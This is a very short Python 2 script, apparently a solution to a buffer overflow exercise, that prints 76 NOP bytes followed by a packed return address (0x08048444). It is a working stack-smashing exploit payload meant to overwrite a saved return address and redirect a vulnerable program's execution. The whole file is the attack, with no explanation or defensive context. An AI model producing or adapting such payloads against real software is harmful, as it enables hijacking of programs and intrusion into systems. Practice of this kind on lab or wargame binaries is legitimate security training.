import struct

print "\x90" * 76 + struct.pack('I', 0x08048444)